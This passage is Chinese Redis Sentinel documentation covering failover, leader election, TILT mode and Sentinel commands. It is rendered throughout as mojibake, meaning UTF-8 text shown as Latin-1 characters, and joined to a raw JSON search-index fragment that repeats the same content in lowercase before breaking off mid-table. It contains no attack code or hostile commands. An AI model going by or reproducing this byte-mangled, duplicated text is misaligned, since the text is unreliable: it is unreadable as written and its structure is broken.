å½ä»¤çæ¶é´å¤§äºäºç§éç slave é½ä¼è¢«æ·æ±°ã\n * å¨å¤±æ master å±ä¸ç slave å½ä¸­ï¼ é£äºä¸å¤±æ master è¿æ¥æ­å¼çæ¶é¿è¶è¿ down-after éé¡¹æå®çæ¶é¿ååç slave é½ä¼è¢«æ·æ±°ã\n * å¨ç»åäºä»¥ä¸ä¸¤è½®æ·æ±°ä¹åå©ä¸æ¥ç slave ä¸­ï¼ æä»¬éåºå¤å¶åç§»éï¼replication offsetï¼æå¤§çé£ä¸ª slave ä½ä¸ºæ°ç masterï¼ å¦æå¤å¶åç§»éä¸å¯ç¨ï¼ æè slave çå¤å¶åç§»éç¸åï¼ é£ä¹å¸¦ææå°è¿è¡ ID çé£ä¸ª slave æä¸ºæ°ç masterã\n\n\n# Sentinel èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨\n\nSentinel èªå¨æéè¿ç§»ä½¿ç¨ Raft ç®æ³æ¥éä¸¾ leaderï¼ç»é¿ï¼Sentinel ï¼ ä»èç¡®ä¿å¨ä¸ä¸ªç»å®ç epoch å¼éï¼ åªæä¸ä¸ª leader äº§çã\n\nè¿è¡¨ç¤ºå¨åä¸ä¸ª epoch å¼ä¸­ï¼ ä¸ä¼æä¸¤ä¸ª Sentinel åæ¶è¢«éä¸­ä¸º leaderï¼ å¹¶ä¸åä¸ª Sentinel å¨åä¸ä¸ª epoch å¼ä¸­åªä¼å¯¹ä¸ä¸ª leader è¿è¡æç¥¨ã\n\næ´é«çéç½® epoch å¼æ»æ¯ä¼äºè¾ä½ç epoch å¼ï¼ å æ­¤æ¯ä¸ª Sentinel é½ä¼ä¸»å¨ä½¿ç¨æ´æ°ç epoch å¼æ¥ä»£æ¿èªå·±çéç½®ã\n\nç®åæ¥è¯´ï¼ æä»¬å¯ä»¥å° Sentinel éç½®çä½æ¯ä¸ä¸ªå¸¦æçæ¬å·çç¶æã ä¸ä¸ªç¶æä¼ä»¥æååå¥èèåºï¼last-write-winsï¼çæ¹å¼ï¼ä¹å³æ¯ï¼ææ°çéç½®æ»æ¯èåºï¼ä¼ æ­è³ææå¶ä» Sentinel ã\n\nä¸¾ä¸ªä¾å­ï¼ å½åºç°ç½ç»åå²ï¼network partitionsï¼æ¶ï¼ ä¸ä¸ª Sentinel å¯è½ä¼åå«äºè¾æ§çéç½®ï¼ èå½è¿ä¸ª Sentinel æ¥å°å¶ä» Sentinel åæ¥ççæ¬æ´æ°çéç½®æ¶ï¼ Sentinel å°±ä¼å¯¹èªå·±çéç½®è¿è¡æ´æ°ã\n\nå¦æè¦å¨ç½ç»åå²åºç°çæåµä¸ä»ç¶ä¿æä¸è´æ§ï¼ é£ä¹åºè¯¥ä½¿ç¨ min-slaves-to-write éé¡¹ï¼ è®© master å¨è¿æ¥çä»å®ä¾å°äºç»å®æ°éæ¶åæ­¢æ§è¡åæä½ï¼ ä¸æ­¤åæ¶ï¼ åºè¯¥å¨æ¯ä¸ªè¿è¡ Redis master æ slave çæºå¨ä¸è¿è¡ Redis Sentinel è¿ç¨ã\n\n\n# Sentinel ç¶æçæä¹å\n\nSentinel çç¶æä¼è¢«æä¹åå¨ Sentinel éç½®æä»¶éé¢ã\n\næ¯å½ Sentinel æ¥æ¶å°ä¸ä¸ªæ°çéç½®ï¼ æèå½ç»é¿ Sentinel ä¸º master åå»ºä¸ä¸ªæ°çéç½®æ¶ï¼ è¿ä¸ªéç½®ä¼ä¸éç½® epoch å¼ä¸èµ·è¢«ä¿å­å°ç£çéé¢ã\n\nè¿æå³çåæ­¢åéå¯ Sentinel è¿ç¨é½æ¯å®å¨çã\n\n\n# Sentinel å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½®\n\nå³ä½¿æ²¡æèªå¨æéè¿ç§»æä½å¨è¿è¡ï¼ Sentinel æ»ä¼å°è¯å°å½åçéç½®è®¾ç½®å°è¢«çè§çå®ä¾ä¸é¢ã ç¹å«æ¯ï¼æ ¹æ®å½åçéç½®ï¼ å¦æä¸ä¸ª slave è¢«å®£åä¸º masterï¼ é£ä¹å®ä¼ä»£æ¿åæç masterï¼ æä¸ºæ°ç masterï¼ å¹¶ä¸æä¸ºåæ master çææ slave çå¤å¶å¯¹è±¡ã é£äºè¿æ¥äºéè¯¯ master ç slave ä¼è¢«éæ°éç½®ï¼ ä½¿å¾è¿äº slave ä¼å»å¤å¶æ­£ç¡®ç masterã\n\nä¸è¿ï¼ å¨ä»¥ä¸è¿äºæ¡ä»¶æ»¡è¶³ä¹åï¼ Sentinel å¨å¯¹å®ä¾è¿è¡éæ°éç½®ä¹åä»ç¶ä¼ç­å¾ä¸æ®µè¶³å¤é¿çæ¶é´ï¼ ç¡®ä¿å¯ä»¥æ¥æ¶å°å¶ä» Sentinel åæ¥çéç½®æ´æ°ï¼ ä»èé¿åèªèº«å ä¸ºä¿å­äºè¿æçéç½®èå¯¹å®ä¾è¿è¡äºä¸å¿è¦çéæ°éç½®ã\n\n\n# TILT æ¨¡å¼\n\nRedis Sentinel ä¸¥éä¾èµè®¡ç®æºçæ¶é´åè½ï¼ æ¯å¦è¯´ï¼ ä¸ºäºå¤æ­ä¸ä¸ªå®ä¾æ¯å¦å¯ç¨ï¼ Sentinel ä¼è®°å½è¿ä¸ªå®ä¾æåä¸æ¬¡ç¸åº PING å½ä»¤çæ¶é´ï¼ å¹¶å°è¿ä¸ªæ¶é´åå½åæ¶é´è¿è¡å¯¹æ¯ï¼ ä»èç¥éè¿ä¸ªå®ä¾æå¤é¿æ¶é´æ²¡æå Sentinel è¿è¡ä»»ä½æåéè®¯ã\n\nä¸è¿ï¼ ä¸æ¦è®¡ç®æºçæ¶é´åè½åºç°æéï¼ æèè®¡ç®æºéå¸¸å¿ç¢ï¼ åæèè¿ç¨å ä¸ºæäºåå èè¢«é»å¡æ¶ï¼ Sentinel å¯è½ä¹ä¼è·çåºç°æéã\n\nTILT æ¨¡å¼æ¯ä¸ç§ç¹æ®çä¿æ¤æ¨¡å¼ï¼ å½ Sentinel åç°ç³»ç»æäºä¸å¯¹å²æ¶ï¼ Sentinel å°±ä¼è¿å¥ TILT æ¨¡å¼ã\n\nå ä¸º Sentinel çæ¶é´ä¸­æ­å¨é»è®¤æ¯ç§æ§è¡ 10 æ¬¡ï¼ æä»¥æä»¬é¢ææ¶é´ä¸­æ­å¨çä¸¤æ¬¡æ§è¡ä¹é´çé´éä¸º 100 æ¯«ç§å·¦å³ã Sentinel çåæ³æ¯ï¼ è®°å½ä¸ä¸æ¬¡æ¶é´ä¸­æ­å¨æ§è¡æ¶çæ¶é´ï¼ å¹¶å°å®åè¿ä¸æ¬¡æ¶é´ä¸­æ­å¨æ§è¡çæ¶é´è¿è¡å¯¹æ¯ï¼\n\nå¦æä¸¤æ¬¡è°ç¨æ¶é´ä¹é´çå·®è·ä¸ºè´å¼ï¼ æèéå¸¸å¤§ï¼è¶è¿ 2 ç§éï¼ï¼ é£ä¹ Sentinel è¿å¥ TILT æ¨¡å¼ã\nå¦æ Sentinel å·²ç»è¿å¥ TILT æ¨¡å¼ï¼ é£ä¹ Sentinel å»¶è¿éåº TILT æ¨¡å¼çæ¶é´ã\n\nå½ Sentinel è¿å¥ TILT æ¨¡å¼æ¶ï¼ å®ä»ç¶ä¼ç»§ç»­çè§ææç®æ ï¼ ä½æ¯ï¼å®ä¸åæ§è¡ä»»ä½æä½ï¼æ¯å¦æéè½¬ç§»ãå½æå®ä¾åè¿ä¸ª Sentinel åé SENTINEL is-master-down-by-addr å½ä»¤æ¶ï¼ Sentinel è¿åè´å¼ï¼ å ä¸ºè¿ä¸ª Sentinel æè¿è¡çä¸çº¿å¤æ­å·²ç»ä¸ååç¡®ãå¦æ TILT å¯ä»¥æ­£å¸¸ç»´æ 30 ç§éï¼ é£ä¹ Sentinel éåº TILT æ¨¡å¼ã\n\n\n# Sentinel å½ä»¤\n\nä»¥ä¸ååºçæ¯ Sentinel æ¥åçå½ä»¤ï¼\n\nå½ä»¤                                 æè¿°\nPING                               å¦æåé¢æ²¡æåæ°æ¶è¿å\n                                   PONGï¼å¦åä¼è¿ååé¢å¸¦çåæ°ãè¿ä¸ªå½ä»¤ç»å¸¸ç¨æ¥æµè¯ä¸ä¸ªè¿æ¥æ¯å¦è¿æ¯å¯ç¨çï¼æèç¨æ¥æµè¯ä¸ä¸ªè¿æ¥çå»¶æ¶ãå¦æå®¢æ·ç«¯å¤äºé¢éè®¢éæ¨¡å¼ä¸ï¼å®å°æ¯ä¸ä¸ª\n                                   multi-bulk è¿åï¼ç¬¬ä¸æ¬¡æ¶è¿åâpongâï¼ä¹åè¿åç©ºï¼empty bulkï¼ï¼é¤éå½ä»¤åé¢æ´éäºåæ°ã\nSENTINEL masters                   ååºææè¢«çè§ç masterï¼ä»¥åè¿äº master çå½åç¶æã\nSENTINEL slaves                    ååºç»å® master çææ slave ï¼ä»¥åè¿äº slave çå½åç¶æ\nSENTINEL get-master-addr-by-name   è¿åç»å®åå­ç master ç IP å°ååç«¯å£å·ã å¦æè¿ä¸ª master æ­£å¨æ§è¡æéè½¬ç§»æä½ï¼ æèéå¯¹è¿ä¸ª\n                                   master çæéè½¬ç§»æä½å·²ç»å®æï¼ é£ä¹è¿ä¸ªå½ä»¤è¿åæ°ç master ç IP å°ååç«¯å£å·\nSENTINEL reset                     éç½®ææåå­åç»å®æ¨¡å¼ pattern ç¸å¹éç master ã pattern åæ°æ¯ä¸ä¸ª Glob é£æ ¼çæ¨¡å¼ã\n                                   éç½®æä½æ¸æ¥ master ç®åçææç¶æï¼ åæ¬æ­£å¨æ§è¡ä¸­çæéè½¬ç§»ï¼ å¹¶ç§»é¤ç®åå·²ç»åç°åå³èçï¼ master\n                                   çææ slave å Sentinel\nSENTINEL failover                  å½ master å¤±ææ¶ï¼ å¨ä¸è¯¢é®å¶ä» Sentinel æè§çæåµä¸ï¼ å¼ºå¶å¼å§ä¸æ¬¡èªå¨æéè¿ç§»\n                                   ï¼ä¸è¿åèµ·æéè½¬ç§»ç Sentinel ä¼åå¶ä» Sentinel åéä¸ä¸ªæ°çéç½®ï¼å¶ä» Sentinel\n                                   ä¼æ ¹æ®è¿ä¸ªéç½®è¿è¡ç¸åºçæ´æ°ï¼",normalizedContent:"# ç®ä»\n\nredis ç sentinel ç³»ç»ç¨äºç®¡çå¤ä¸ª redis æå¡å¨ï¼ è¯¥ç³»ç»æ§è¡ä»¥ä¸ä¸ä¸ªä»»å¡ï¼\n\n * çæ§ï¼monitoringï¼ï¼ sentinel ä¼ä¸æ­å°æ£æ¥ä½ ç master å slave æ¯å¦è¿ä½æ­£å¸¸ã\n * æéï¼notificationï¼ï¼ å½è¢«çæ§çæä¸ª redis æå¡å¨åºç°é®é¢æ¶ï¼ sentinel å¯ä»¥éè¿ api åç®¡çåæèå¶ä»åºç¨ç¨åºåééç¥ã\n * èªå¨æéè¿ç§»ï¼automatic failoverï¼ï¼ å½ä¸ä¸ª master ä¸è½æ­£å¸¸å·¥ä½æ¶ï¼ sentinel ä¼å¼å§ä¸æ¬¡èªå¨æéè¿ç§»æä½ï¼ å®ä¼å°å¤±æ master çå¶ä¸­ä¸ä¸ª slave åçº§ä¸ºæ°ç masterï¼ å¹¶è®©å¤±æ master çå¶ä» slave æ¹ä¸ºå¤å¶æ°ç masterï¼ å½å®¢æ·ç«¯è¯å¾è¿æ¥å¤±æç master æ¶ï¼ éç¾¤ä¹ä¼åå®¢æ·ç«¯è¿åæ° master çå°åï¼ ä½¿å¾éç¾¤å¯ä»¥ä½¿ç¨æ° master ä»£æ¿å¤±ææå¡å¨ã\n\n\n\nå¨é»è®¤æåµä¸ï¼ sentinel ä½¿ç¨ tcp ç«¯å£ 26379 ï¼æ®é redis æå¡å¨ä½¿ç¨çæ¯ 6379 ï¼ã\n\nsentinel æ¥å redis åè®®æ ¼å¼çå½ä»¤è¯·æ±ï¼ æä»¥ä½ å¯ä»¥ä½¿ç¨ redis-cli æèä»»ä½å¶ä» redis å®¢æ·ç«¯æ¥ä¸ sentinel è¿è¡éè®¯ã\n\næä¸¤ç§æ¹å¼å¯ä»¥å sentinel è¿è¡éè®¯ï¼\n\n * ç¬¬ä¸ç§æ¹æ³æ¯éè¿ç´æ¥åéå½ä»¤æ¥æ¥è¯¢è¢«çè§ redis æå¡å¨çå½åç¶æï¼ ä»¥å sentinel æç¥éçå³äºå¶ä» sentinel çä¿¡æ¯ï¼ è¯¸å¦æ­¤ç±»ã\n * å¦ä¸ç§æ¹æ³æ¯ä½¿ç¨åå¸ä¸è®¢éåè½ï¼ éè¿æ¥æ¶ sentinel åéçéç¥ï¼ å½æ§è¡æéè½¬ç§»æä½ï¼ æèæä¸ªè¢«çè§çæå¡å¨è¢«å¤æ­ä¸ºä¸»è§ä¸çº¿æèå®¢è§ä¸çº¿æ¶ï¼ sentinel å°±ä¼åéç¸åºçä¿¡æ¯ã\n\n\n# æ¯ä¸ª sentinel é½éè¦å®ææ§è¡çä»»å¡\n\næ¯ä¸ª sentinel ä»¥æ¯ç§éä¸æ¬¡çé¢çåå®æç¥ç master ãslave ä»¥åå¶ä» sentinel å®ä¾åéä¸ä¸ª ping å½ä»¤ã\n\nå¦æä¸ä¸ªå®ä¾ï¼instanceï¼è·ç¦»æåä¸æ¬¡ææåå¤ ping å½ä»¤çæ¶é´è¶è¿ down-after-milliseconds éé¡¹ææå®çå¼ï¼ é£ä¹è¿ä¸ªå®ä¾ä¼è¢« sentinel æ è®°ä¸ºä¸»è§ä¸çº¿ã ä¸ä¸ªææåå¤å¯ä»¥æ¯ï¼ +pong ã -loading æè -masterdown ã\n\nå¦æä¸ä¸ª master è¢«æ è®°ä¸ºä¸»è§ä¸çº¿ï¼ é£ä¹æ­£å¨çè§è¿ä¸ª master çææ sentinel è¦ä»¥æ¯ç§ä¸æ¬¡çé¢çç¡®è®¤ master çç¡®è¿å¥äºä¸»è§ä¸çº¿ç¶æã\n\nå¦æä¸ä¸ª master è¢«æ è®°ä¸ºä¸»è§ä¸çº¿ï¼ å¹¶ä¸æè¶³å¤æ°éç sentinel ï¼è³å°è¦è¾¾å°éç½®æä»¶æå®çæ°éï¼å¨æå®çæ¶é´èå´ååæè¿ä¸å¤æ­ï¼ é£ä¹è¿ä¸ª master è¢«æ è®°ä¸ºå®¢è§ä¸çº¿ã\n\nå¨ä¸è¬æåµä¸ï¼ æ¯ä¸ª sentinel ä¼ä»¥æ¯ 10 ç§ä¸æ¬¡çé¢çåå®å·²ç¥çææ master å slave åé info å½ä»¤ã å½ä¸ä¸ª master è¢« sentinel æ è®°ä¸ºå®¢è§ä¸çº¿æ¶ï¼ sentinel åä¸çº¿ master çææ slave åé info å½ä»¤çé¢çä¼ä» 10 ç§ä¸æ¬¡æ¹ä¸ºæ¯ç§ä¸æ¬¡ã\n\nå½æ²¡æè¶³å¤æ°éç sentinel åæ master å·²ç»ä¸çº¿ï¼ master çå®¢è§ä¸çº¿ç¶æå°±ä¼è¢«ç§»é¤ã å½ master éæ°å sentinel ç ping å½ä»¤è¿åææåå¤æ¶ï¼ master çä¸»è§ä¸çº¿ç¶æå°±ä¼è¢«ç§»é¤ã\n\n\n# èªå¨åç° sentinel åä»æå¡å¨\n\nä¸ä¸ª sentinel å¯ä»¥ä¸å¶ä»å¤ä¸ª sentinel è¿è¡è¿æ¥ï¼ åä¸ª sentinel ä¹é´å¯ä»¥äºç¸æ£æ¥å¯¹æ¹çå¯ç¨æ§ï¼ å¹¶è¿è¡ä¿¡æ¯äº¤æ¢ã\n\nä½ æ é¡»ä¸ºè¿è¡çæ¯ä¸ª sentinel åå«è®¾ç½®å¶ä» sentinel çå°åï¼ å ä¸º sentinel å¯ä»¥éè¿åå¸ä¸è®¢éåè½æ¥èªå¨åç°æ­£å¨çè§ç¸å master çå¶ä» sentinel ï¼ è¿ä¸åè½æ¯éè¿åé¢é sentinel:hello åéä¿¡æ¯æ¥å®ç°çã\n\nä¸æ­¤ç±»ä¼¼ï¼ ä½ ä¹ä¸å¿æå¨ååº master å±ä¸çææ slave ï¼ å ä¸º sentinel å¯ä»¥éè¿è¯¢é® master æ¥è·å¾ææ slave çä¿¡æ¯ã\n\næ¯ä¸ª sentinel ä¼ä»¥æ¯ä¸¤ç§ä¸æ¬¡çé¢çï¼ éè¿åå¸ä¸è®¢éåè½ï¼ åè¢«å®çè§çææ master å slave ç sentinel:hello é¢éåéä¸æ¡ä¿¡æ¯ï¼ ä¿¡æ¯ä¸­åå«äº sentinel ç ip å°åãç«¯å£å·åè¿è¡ id ï¼runidï¼ã\n\næ¯ä¸ª sentinel é½è®¢éäºè¢«å®çè§çææ master å slave ç sentinel:hello é¢éï¼ æ¥æ¾ä¹åæªåºç°è¿ç sentinel ï¼looking for unknown sentinelsï¼ã å½ä¸ä¸ª sentinel åç°ä¸ä¸ªæ°ç sentinel æ¶ï¼ å®ä¼å°æ°ç sentinel æ·»å å°ä¸ä¸ªåè¡¨ä¸­ï¼ è¿ä¸ªåè¡¨ä¿å­äº sentinel å·²ç¥çï¼ çè§åä¸ä¸ª master çææå¶ä» sentinel ã\n\nsentinel åéçä¿¡æ¯ä¸­è¿åæ¬å®æ´ç master å½åéç½®ï¼configurationï¼ã å¦æä¸ä¸ª sentinel åå«ç master éç½®æ¯å¦ä¸ä¸ª sentinel åéçéç½®è¦æ§ï¼ é£ä¹è¿ä¸ª sentinel ä¼ç«å³åçº§å°æ°éç½®ä¸ã\n\nå¨å°ä¸ä¸ªæ° sentinel æ·»å å°çè§ master çåè¡¨ä¸é¢ä¹åï¼ sentinel ä¼åæ£æ¥åè¡¨ä¸­æ¯å¦å·²ç»åå«äºåè¦æ·»å ç sentinel æ¥æç¸åè¿è¡ id æèç¸åå°åï¼åæ¬ ip å°ååç«¯å£å·ï¼ç sentinel ï¼ å¦ææ¯çè¯ï¼ sentinel ä¼åç§»é¤åè¡¨ä¸­å·²æçé£äºæ¥æç¸åè¿è¡ id æèç¸åå°åç sentinel ï¼ ç¶ååæ·»å æ° sentinel ã\n\n\n# æéè½¬ç§»\n\nä¸æ¬¡æéè½¬ç§»æä½ç±ä»¥ä¸æ­¥éª¤ç»æï¼\n\n * åç° master å·²ç»è¿å¥å®¢è§ä¸çº¿ç¶æã\n * å¯¹æä»¬çå½å epoch å¼è¿è¡èªå¢ï¼ å¹¶å°è¯å¨è¿ä¸ª epoch å¼ä¸­å½éã\n * å¦æå½éå¤±è´¥ï¼ é£ä¹å¨è®¾å®çæéè¿ç§»è¶æ¶æ¶é´çä¸¤åä¹åï¼ éæ°å°è¯å½éã å¦æå½éæåï¼ é£ä¹æ§è¡ä»¥ä¸æ­¥éª¤ã\n * éåºä¸ä¸ª slaveï¼å¹¶å°å®åçº§ä¸º masterã\n * åè¢«éä¸­ç slave åéÂ  slaveof no one Â å½ä»¤ï¼è®©å®è½¬åä¸º masterã\n * éè¿åå¸ä¸è®¢éåè½ï¼ å°æ´æ°åçéç½®ä¼ æ­ç»ææå¶ä» sentinel ï¼ å¶ä» sentinel å¯¹å®ä»¬èªå·±çéç½®è¿è¡æ´æ°ã\n * åå·²ä¸çº¿ master ç slave åéÂ slaveof å½ä»¤ï¼ è®©å®ä»¬å»å¤å¶æ°ç masterã\n * å½ææ slave é½å·²ç»å¼å§å¤å¶æ°ç master æ¶ï¼ é¢å¤´ sentinel ç»æ­¢è¿æ¬¡æéè¿ç§»æä½ã\n\næ¯å½ä¸ä¸ª redis å®ä¾è¢«éæ°éç½®ï¼reconfiguredï¼ ââ æ è®ºæ¯è¢«è®¾ç½®æ masterãslaveãåæèè¢«è®¾ç½®æå¶ä» master ç slave ââ sentinel é½ä¼åè¢«éæ°éç½®çå®ä¾åéä¸ä¸ª config rewrite å½ä»¤ï¼ ä»èç¡®ä¿è¿äºéç½®ä¼æä¹åå¨ç¡¬çéã\n\nsentinel ä½¿ç¨ä»¥ä¸è§åæ¥éæ©æ°ç masterï¼\n\n * å¨å¤±æ master å±ä¸ç slave å½ä¸­ï¼ é£äºè¢«æ è®°ä¸ºä¸»è§ä¸çº¿ãå·²æ­çº¿ãæèæåä¸æ¬¡åå¤Â pingÂ å½ä»¤çæ¶é´å¤§äºäºç§éç slave é½ä¼è¢«æ·æ±°ã\n * å¨å¤±æ master å±ä¸ç slave å½ä¸­ï¼ é£äºä¸å¤±æ master è¿æ¥æ­å¼çæ¶é¿è¶è¿ down-after éé¡¹æå®çæ¶é¿ååç slave é½ä¼è¢«æ·æ±°ã\n * å¨ç»åäºä»¥ä¸ä¸¤è½®æ·æ±°ä¹åå©ä¸æ¥ç slave ä¸­ï¼ æä»¬éåºå¤å¶åç§»éï¼replication offsetï¼æå¤§çé£ä¸ª slave ä½ä¸ºæ°ç masterï¼ å¦æå¤å¶åç§»éä¸å¯ç¨ï¼ æè slave çå¤å¶åç§»éç¸åï¼ é£ä¹å¸¦ææå°è¿è¡ id çé£ä¸ª slave æä¸ºæ°ç masterã\n\n\n# sentinel èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨\n\nsentinel èªå¨æéè¿ç§»ä½¿ç¨ raft ç®æ³æ¥éä¸¾ leaderï¼ç»é¿ï¼sentinel ï¼ ä»èç¡®ä¿å¨ä¸ä¸ªç»å®ç epoch å¼éï¼ åªæä¸ä¸ª leader äº§çã\n\nè¿è¡¨ç¤ºå¨åä¸ä¸ª epoch å¼ä¸­ï¼ ä¸ä¼æä¸¤ä¸ª sentinel åæ¶è¢«éä¸­ä¸º leaderï¼ å¹¶ä¸åä¸ª sentinel å¨åä¸ä¸ª epoch å¼ä¸­åªä¼å¯¹ä¸ä¸ª leader è¿è¡æç¥¨ã\n\næ´é«çéç½® epoch å¼æ»æ¯ä¼äºè¾ä½ç epoch å¼ï¼ å æ­¤æ¯ä¸ª sentinel é½ä¼ä¸»å¨ä½¿ç¨æ´æ°ç epoch å¼æ¥ä»£æ¿èªå·±çéç½®ã\n\nç®åæ¥è¯´ï¼ æä»¬å¯ä»¥å° sentinel éç½®çä½æ¯ä¸ä¸ªå¸¦æçæ¬å·çç¶æã ä¸ä¸ªç¶æä¼ä»¥æååå¥èèåºï¼last-write-winsï¼çæ¹å¼ï¼ä¹å³æ¯ï¼ææ°çéç½®æ»æ¯èåºï¼ä¼ æ­è³ææå¶ä» sentinel ã\n\nä¸¾ä¸ªä¾å­ï¼ å½åºç°ç½ç»åå²ï¼network partitionsï¼æ¶ï¼ ä¸ä¸ª sentinel å¯è½ä¼åå«äºè¾æ§çéç½®ï¼ èå½è¿ä¸ª sentinel æ¥å°å¶ä» sentinel åæ¥ççæ¬æ´æ°çéç½®æ¶ï¼ sentinel å°±ä¼å¯¹èªå·±çéç½®è¿è¡æ´æ°ã\n\nå¦æè¦å¨ç½ç»åå²åºç°çæåµä¸ä»ç¶ä¿æä¸è´æ§ï¼ é£ä¹åºè¯¥ä½¿ç¨ min-slaves-to-write éé¡¹ï¼ è®© master å¨è¿æ¥çä»å®ä¾å°äºç»å®æ°éæ¶åæ­¢æ§è¡åæä½ï¼ ä¸æ­¤åæ¶ï¼ åºè¯¥å¨æ¯ä¸ªè¿è¡ redis master æ slave çæºå¨ä¸è¿è¡ redis sentinel è¿ç¨ã\n\n\n# sentinel ç¶æçæä¹å\n\nsentinel çç¶æä¼è¢«æä¹åå¨ sentinel éç½®æä»¶éé¢ã\n\næ¯å½ sentinel æ¥æ¶å°ä¸ä¸ªæ°çéç½®ï¼ æèå½ç»é¿ sentinel ä¸º master åå»ºä¸ä¸ªæ°çéç½®æ¶ï¼ è¿ä¸ªéç½®ä¼ä¸éç½® epoch å¼ä¸èµ·è¢«ä¿å­å°ç£çéé¢ã\n\nè¿æå³çåæ­¢åéå¯ sentinel è¿ç¨é½æ¯å®å¨çã\n\n\n# sentinel å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½®\n\nå³ä½¿æ²¡æèªå¨æéè¿ç§»æä½å¨è¿è¡ï¼ sentinel æ»ä¼å°è¯å°å½åçéç½®è®¾ç½®å°è¢«çè§çå®ä¾ä¸é¢ã ç¹å«æ¯ï¼æ ¹æ®å½åçéç½®ï¼ å¦æä¸ä¸ª slave è¢«å®£åä¸º masterï¼ é£ä¹å®ä¼ä»£æ¿åæç masterï¼ æä¸ºæ°ç masterï¼ å¹¶ä¸æä¸ºåæ master çææ slave çå¤å¶å¯¹è±¡ã é£äºè¿æ¥äºéè¯¯ master ç slave ä¼è¢«éæ°éç½®ï¼ ä½¿å¾è¿äº slave ä¼å»å¤å¶æ­£ç¡®ç masterã\n\nä¸è¿ï¼ å¨ä»¥ä¸è¿äºæ¡ä»¶æ»¡è¶³ä¹åï¼ sentinel å¨å¯¹å®ä¾è¿è¡éæ°éç½®ä¹åä»ç¶ä¼ç­å¾ä¸æ®µè¶³å¤é¿çæ¶é´ï¼ ç¡®ä¿å¯ä»¥æ¥æ¶å°å¶ä» sentinel åæ¥çéç½®æ´æ°ï¼ ä»èé¿åèªèº«å ä¸ºä¿å­äºè¿æçéç½®èå¯¹å®ä¾è¿è¡äºä¸å¿è¦çéæ°éç½®ã\n\n\n# tilt æ¨¡å¼\n\nredis sentinel ä¸¥éä¾èµè®¡ç®æºçæ¶é´åè½ï¼ æ¯å¦è¯´ï¼ ä¸ºäºå¤æ­ä¸ä¸ªå®ä¾æ¯å¦å¯ç¨ï¼ sentinel ä¼è®°å½è¿ä¸ªå®ä¾æåä¸æ¬¡ç¸åº ping å½ä»¤çæ¶é´ï¼ å¹¶å°è¿ä¸ªæ¶é´åå½åæ¶é´è¿è¡å¯¹æ¯ï¼ ä»èç¥éè¿ä¸ªå®ä¾æå¤é¿æ¶é´æ²¡æå sentinel è¿è¡ä»»ä½æåéè®¯ã\n\nä¸è¿ï¼ ä¸æ¦è®¡ç®æºçæ¶é´åè½åºç°æéï¼ æèè®¡ç®æºéå¸¸å¿ç¢ï¼ åæèè¿ç¨å ä¸ºæäºåå èè¢«é»å¡æ¶ï¼ sentinel å¯è½ä¹ä¼è·çåºç°æéã\n\ntilt æ¨¡å¼æ¯ä¸ç§ç¹æ®çä¿æ¤æ¨¡å¼ï¼ å½ sentinel åç°ç³»ç»æäºä¸å¯¹å²æ¶ï¼ sentinel å°±ä¼è¿å¥ tilt æ¨¡å¼ã\n\nå ä¸º sentinel çæ¶é´ä¸­æ­å¨é»è®¤æ¯ç§æ§è¡ 10 æ¬¡ï¼ æä»¥æä»¬é¢ææ¶é´ä¸­æ­å¨çä¸¤æ¬¡æ§è¡ä¹é´çé´éä¸º 100 æ¯«ç§å·¦å³ã sentinel çåæ³æ¯ï¼ è®°å½ä¸ä¸æ¬¡æ¶é´ä¸­æ­å¨æ§è¡æ¶çæ¶é´ï¼ å¹¶å°å®åè¿ä¸æ¬¡æ¶é´ä¸­æ­å¨æ§è¡çæ¶é´è¿è¡å¯¹æ¯ï¼\n\nå¦æä¸¤æ¬¡è°ç¨æ¶é´ä¹é´çå·®è·ä¸ºè´å¼ï¼ æèéå¸¸å¤§ï¼è¶è¿ 2 ç§éï¼ï¼ é£ä¹ sentinel è¿å¥ tilt æ¨¡å¼ã\nå¦æ sentinel å·²ç»è¿å¥ tilt æ¨¡å¼ï¼ é£ä¹ sentinel å»¶è¿éåº tilt æ¨¡å¼çæ¶é´ã\n\nå½ sentinel è¿å¥ tilt æ¨¡å¼æ¶ï¼ å®ä»ç¶ä¼ç»§ç»­çè§ææç®æ ï¼ ä½æ¯ï¼å®ä¸åæ§è¡ä»»ä½æä½ï¼æ¯å¦æéè½¬ç§»ãå½æå®ä¾åè¿ä¸ª sentinel åé sentinel is-master-down-by-addr å½ä»¤æ¶ï¼ sentinel è¿åè´å¼ï¼ å ä¸ºè¿ä¸ª sentinel æè¿è¡çä¸çº¿å¤æ­å·²ç»ä¸ååç¡®ãå¦æ tilt å¯ä»¥æ­£å¸¸ç»´æ 30 ç§éï¼ é£ä¹ sentinel éåº tilt æ¨¡å¼ã\n\n\n# sentinel å½ä»¤\n\nä»¥ä¸ååºçæ¯ sentinel æ¥åçå½ä»¤ï¼\n\nå½ä»¤                                 æè¿°\nping                               å¦æåé¢æ²¡æåæ°æ¶è¿å\n                                   pongï¼å¦åä¼è¿ååé¢å¸¦çåæ°ãè¿ä¸ªå½ä»¤ç»å¸¸ç¨æ¥æµè¯ä¸ä¸ªè¿æ¥æ¯å¦è¿æ¯å¯ç¨çï¼æèç¨æ¥æµè¯ä¸ä¸ªè¿æ¥çå»¶æ¶ãå¦æå®¢æ·ç«¯å¤äºé¢éè®¢éæ¨¡å¼ä¸ï¼å®å°æ¯ä¸ä¸ª\n                                   multi-bulk è¿åï¼ç¬¬ä¸æ¬¡æ¶è¿åâpongâï¼ä¹åè¿åç©ºï¼empty bulkï¼ï¼é¤éå½ä»¤åé¢æ´éäºåæ°ã\nsentinel masters                   ååºææè¢«çè§ç masterï¼ä»¥åè¿äº master çå½åç¶æã\nsentinel slaves                    ååºç»å® master çææ slave ï¼ä»¥åè¿äº slave çå½åç¶æ\nsentinel get-master-addr-by-name   è¿åç»å®åå­ç master ç ip å°ååç«¯å£å·ã å¦æè¿ä¸ª master æ­£å¨æ§è¡æéè½¬ç§»æä½ï¼ æèéå¯¹è¿ä¸ª\n                                   master çæéè½¬ç§»æä½å·²ç»å®æï¼ é£ä¹è¿ä¸ªå½ä»¤è¿åæ°ç master ç ip å°ååç«¯å£å·\nsentinel reset                     éç½®ææåå­åç»å®æ¨¡å¼ pattern ç¸å¹éç master ã pattern åæ°æ¯ä¸ä¸ª glob é£æ ¼çæ¨¡å¼ã\n                                   éç½®æä½æ¸æ¥ master ç®åçææç¶æï¼ åæ¬æ­£å¨æ§è¡ä¸­çæéè½¬ç§»ï¼ 